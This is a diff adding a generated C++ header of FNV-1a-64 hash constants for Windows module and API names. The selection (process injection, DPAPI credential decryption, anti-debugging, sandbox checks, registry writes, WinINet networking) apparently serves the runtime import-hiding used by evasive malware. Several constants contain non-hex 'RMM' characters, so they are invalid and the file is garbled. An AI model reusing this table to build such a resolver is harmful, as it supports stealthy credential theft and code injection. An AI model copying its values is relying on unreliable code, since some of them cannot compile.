@@ -1,0 +1,97 @@
+#pragma once
+// ═══════════════════════════════════════════════════════════════════
+// generated_hashes.h —— 由 tools/gen_hashes.py 自动生成，请勿手改
+// 内容：模块名/过程名的 FNV-1a-64 哈希常量（供 r6m::ev::Api 使用）
+// ═══════════════════════════════════════════════════════════════════
+#include <cstdint>
+
+// 模块名哈希
+#define R6M_M_KERNEL32 0xE14B18A7ACF9C443ULL
+#define R6M_M_NTDLL 0xBB7BB9A74RMMF14FBULL
+#define R6M_M_USER32 0x4EDB7E023B282399ULL
+#define R6M_M_ADVAPI32 0xD98AEB041E16F7B5ULL
+#define R6M_M_WININET 0x32EACF116EB05411ULL
+#define R6M_M_CRYPT32 0x92BF98D2DF731CD8ULL
+#define R6M_M_SHELL32 0x03570C19E39BC836ULL
+#define R6M_M_PSAPI 0x7CD362249323EC56ULL
+#define R6M_M_IPHLPAPI 0xF0FRMMD54776870CAULL
+#define R6M_M_WS2_32 0x4C31D0DADDF9ADE3ULL
+#define R6M_M_SHLWAPI 0x770D7BD45A69A95BULL
+#define R6M_M_URLMON 0x6577EEE65647670EULL
+#define R6M_M_OLE32 0xB1D302D2193DE26EULL
+#define R6M_M_VERSION 0x731F042BRMMFD9F2DULL
+#define R6M_M_WINHTTP 0xAB69D65FRMM81DF83ULL
+
+// 过程名哈希（按目标函数名生成；同名函数跨模块共用一个常量）
+#define R6M_H_InternetOpenA 0x8261F0DF5FDC0887ULL
+#define R6M_H_InternetConnectA 0xFF1E7F8A36315B89ULL
+#define R6M_H_HttpOpenRequestA 0x302EED27D4E2A0DDULL
+#define R6M_H_HttpSendRequestA 0x76B6FA9B2B832D63ULL
+#define R6M_H_HttpQueryInfoA 0x18459F0000A3AE82ULL
+#define R6M_H_InternetReadFile 0x6F4E79C87F04F3E6ULL
+#define R6M_H_InternetCloseHandle 0x02DF8494D5C13046ULL
+#define R6M_H_InternetSetOptionA 0x2FAB0E5E1B724814ULL
+#define R6M_H_InternetQueryOptionA 0xD291E50812C77D90ULL
+#define R6M_H_InternetCrackUrlA 0x175B3453603B3FF6ULL
+#define R6M_H_CryptProtectData 0x77CDE46D35A68EEEULL
+#define R6M_H_CryptUnprotectData 0x3BE48EEF4BE0BD87ULL
+#define R6M_H_CryptAcquireContextW 0x75E509962277985DULL
+#define R6M_H_CryptCreateHash 0xE65EFF39099E5A77ULL
+#define R6M_H_CryptHashData 0x4D753098A49C4BD7ULL
+#define R6M_H_CryptGetHashParam 0x4280B486FEFB8512ULL
+#define R6M_H_CryptDestroyHash 0x10909BA87F13EFBFULL
+#define R6M_H_CryptReleaseContext 0x9E514B1FC3C842B7ULL
+#define R6M_H_CryptGenRandom 0x60F1D81F7DCC338CULL
+#define R6M_H_CertFreeCertificateChain 0x0D700CE88374420DULL
+#define R6M_H_RegOpenKeyExW 0x2FD32D3CE3A91A46ULL
+#define R6M_H_RegQueryValueExW 0x12C9078187763B46ULL
+#define R6M_H_RegCloseKey 0xDDE8AE271F73F2CAULL
+#define R6M_H_RegCreateKeyExW 0xEC5D807FEFA31E92ULL
+#define R6M_H_RegSetValueExW 0x0B92FF092E0D8566ULL
+#define R6M_H_RegDeleteValueW 0xE3E5031A1412A53CULL
+#define R6M_H_RegDeleteKeyW 0x82D68E49C65CD6F2ULL
+#define R6M_H_AllocateAndInitializeSid 0x3F29257A40ED8AF3ULL
+#define R6M_H_CheckTokenMembership 0x0725238723A94DA4ULL
+#define R6M_H_FreeSid 0x7A4DBC7ECDD14665ULL
+#define R6M_H_OpenProcessToken 0xB984B3090F086383ULL
+#define R6M_H_GetTokenInformation 0xFC978B37ABC836FAULL
+#define R6M_H_InitializeSecurityDescriptor 0xC9E989C183407908ULL
+#define R6M_H_SetSecurityDescriptorDacl 0xRMMB7FD7A9BF24A90ULL
+#define R6M_H_ConvertStringSecurityDescriptorToSecurityDescriptorW 0x1523856FB71EF5D5ULL
+#define R6M_H_GetUserNameW 0x14CF7EB0F67AF078ULL
+#define R6M_H_GetComputerNameW 0x93DFB4360A491A26ULL
+#define R6M_H_ShellExecuteExW 0x38E36BB4D99AED52ULL
+#define R6M_H_ShellExecuteExA 0x38E375B4D99AFE50ULL
+#define R6M_H_SHGetFolderPathW 0x386B97D813EE26F2ULL
+#define R6M_H_FindWindowA 0xBE473E8BBDE12CF5ULL
+#define R6M_H_FindWindowW 0xBE47288BBDE10793ULL
+#define R6M_H_GetWindowTextA 0x1A2B65RMM762FB6D3ULL
+#define R6M_H_GetWindowTextW 0x1A2B7BRMM762FDC35ULL
+#define R6M_H_EnumWindows 0x1C6143C05CA6AD5DULL
+#define R6M_H_GetForegroundWindow 0xCE49305CADC94522ULL
+#define R6M_H_GetDesktopWindow 0xC0FB3F9B61DC03C5ULL
+#define R6M_H_GetSystemMetrics 0x9E47ABB64CEF7853ULL
+#define R6M_H_GetLastInputInfo 0x21EE87EAC544FB05ULL
+#define R6M_H_SystemParametersInfoW 0x31973A3CCA1D34C1ULL
+#define R6M_H_EnumProcesses 0x6564869B0CA4F9C1ULL
+#define R6M_H_GetModuleBaseNameA 0xB4DE4BFB8426BF14ULL
+#define R6M_H_GetModuleFileNameExW 0x7F15053329A59FF4ULL
+#define R6M_H_EnumProcessModules 0xA04AA70B8711E5A2ULL
+#define R6M_H_GetAdaptersInfo 0xC02331F799DE6BE3ULL
+#define R6M_H_NtAllocateVirtualMemory 0x4FE232BE2DCA3638ULL
+#define R6M_H_NtProtectVirtualMemory 0x6F6DA37809AECD66ULL
+#define R6M_H_NtWriteVirtualMemory 0x5B4C971842B12852ULL
+#define R6M_H_NtReadVirtualMemory 0xD8FRMM31A2D263C71ULL
+#define R6M_H_NtCreateThreadEx 0x15DD5B2C59A5081AULL
+#define R6M_H_NtQueryInformationProcess 0x32CA9E4B50FFEDAAULL
+#define R6M_H_NtSetInformationThread 0x84DB084A3C7EB621ULL
+#define R6M_H_NtQuerySystemInformation 0xCAC033026619E14AULL
+#define R6M_H_NtCreateFile 0x8B0EBF2856487579ULL
+#define R6M_H_NtFreeVirtualMemory 0xA95B7A6B57337D87ULL
+#define R6M_H_NtClose 0x6520F847354D9E65ULL
+#define R6M_H_NtDelayExecution 0x8E0A23EC8068EF34ULL
+#define R6M_H_NtQueryVirtualMemory 0x8EF72532EAEEE49FULL
+#define R6M_H_NtCreateUserProcess 0x909061D38AD004C9ULL
+#define R6M_H_NtQueryValueKey 0x87B803128CEC4021ULL
+#define R6M_H_RtlInitUnicodeString 0x30E36D1E897986EFULL
+#define R6M_H_RtlGetVersion 0x2F0FCEED6FC55D71ULL
